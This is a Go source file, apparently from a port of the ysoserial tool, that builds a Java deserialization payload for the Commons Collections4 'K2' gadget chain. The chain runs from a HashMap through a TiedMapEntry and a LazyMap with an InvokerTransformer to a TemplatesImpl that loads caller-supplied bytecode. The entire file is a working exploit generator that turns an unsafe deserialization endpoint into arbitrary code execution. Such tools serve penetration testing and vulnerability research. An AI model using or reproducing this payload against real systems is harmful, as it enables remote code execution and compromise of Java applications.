package ysoserial

func CommonsCollectionsK2(bytecodes []byte) []byte {
	return ClassObject{
		name:             "java.util.HashMap",
		serialVersionUID: 362498820763181265,
		classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 12},
		},
		objectAnnotations: interfaces(
			ClassObject{
				name:             "org.apache.commons.collections4.keyvalue.TiedMapEntry",
				serialVersionUID: -8453869361373831205,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Object;", "key", ClassObject{
						name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
						serialVersionUID: 673094361519270707,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{Integer, "_indentNumber", 0},
							{Integer, "_transletIndex", 0},
							{"[[B", "_bytecodes", ArrayObject{
								name:             "[[B",
								serialVersionUID: 5475560301672258359,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									ArrayObject{
										name:             "[B",
										serialVersionUID: -5984413125824719648,
										classDescFlags:   SC_SERIALIZABLE,
										values:           interfaces(bytecodes),
									}, ArrayObject{
										name:             "[B",
										serialVersionUID: -5984413125824719648,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x33), byte(0x00), byte(0x11), byte(0x01), byte(0x00), byte(0x3f), byte(0x6f), byte(0x72), byte(0x67), byte(0x2f), byte(0x61), byte(0x70), byte(0x61), byte(0x63), byte(0x68), byte(0x65), byte(0x2f), byte(0x63), byte(0x61), byte(0x74), byte(0x61), byte(0x6c), byte(0x69), byte(0x6e), byte(0x61), byte(0x2f), byte(0x63), byte(0x6f), byte(0x6c), byte(0x65), byte(0x63), byte(0x74), byte(0x69), byte(0x6f), byte(0x6e), byte(0x73), byte(0x34), byte(0x2f), byte(0x6d), byte(0x61), byte(0x70), byte(0x2f), byte(0x41), byte(0x62), byte(0x73), byte(0x74), byte(0x72), byte(0x61), byte(0x63), byte(0x74), byte(0x53), byte(0x6f), byte(0x72), byte(0x74), byte(0x65), byte(0x64), byte(0x4d), byte(0x61), byte(0x70), byte(0x44), byte(0x65), byte(0x63), byte(0x6f), byte(0x72), byte(0x61), byte(0x74), byte(0x6f), byte(0x72), byte(0x07), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x07), byte(0x00), byte(0x03), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x1f), byte(0x41), byte(0x62), byte(0x73), byte(0x74), byte(0x72), byte(0x61), byte(0x63), byte(0x74), byte(0x53), byte(0x6f), byte(0x72), byte(0x74), byte(0x65), byte(0x64), byte(0x4d), byte(0x61), byte(0x70), byte(0x44), byte(0x65), byte(0x63), byte(0x6f), byte(0x72), byte(0x61), byte(0x74), byte(0x6f), byte(0x72), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x0c), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x0a), byte(0x00), byte(0x04), byte(0x00), byte(0x0e), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x07), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x0b), byte(0x00), byte(0x02), byte(0x00), byte(0x09), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x0d), byte(0x00), byte(0x01), byte(0x00), byte(0x10), byte(0x00), byte(0x11), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x0f), byte(0xb1), byte(0x00), byte(0x01), byte(0x00), byte(0x05), byte(0x00), byte(0x02), byte(0x00), byte(0x06),
										),
									},
								),
							}},
							{"[Ljava/lang/Class;", "_class", nil},
							{"Ljava/lang/String;", "_name", "KFVZJQMI"},
							{"Ljava/util/Properties;", "_outputProperties", nil},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					}},
					{"Ljava/util/Map;", "map", ClassObject{
						name:             "org.apache.commons.collections4.map.LazyMap",
						serialVersionUID: 7990956402564206740,
						classDescFlags:   SC_SERIALIZABLE | SC_WRITE_METHOD,
						fields: []Field{
							{"Lorg/apache/commons/collections4/Transformer;", "factory", ClassObject{
								name:             "org.apache.commons.collections4.functors.InvokerTransformer",
								serialVersionUID: -8653385846894047688,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Ljava/lang/Object;", "iArgs", ArrayObject{
										name:             "[Ljava.lang.Object;",
										serialVersionUID: -8012369246846506644,
										classDescFlags:   SC_SERIALIZABLE,
										values:           interfaces(),
									}},
									{Object, "iMethodName", "newTransformer"},
									{Array, "iParamTypes", ArrayObject{
										name:             "[Ljava.lang.Class;",
										serialVersionUID: -6118465897992725863,
										classDescFlags:   SC_SERIALIZABLE,
										values:           interfaces(),
									}},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}},
						},
						objectAnnotations: interfaces(),
						super:             nil,
					}},
				},
				objectAnnotations: interfaces(
					blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
					ClassDesc{
						name: "t",
					},
				),
				super: nil,
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
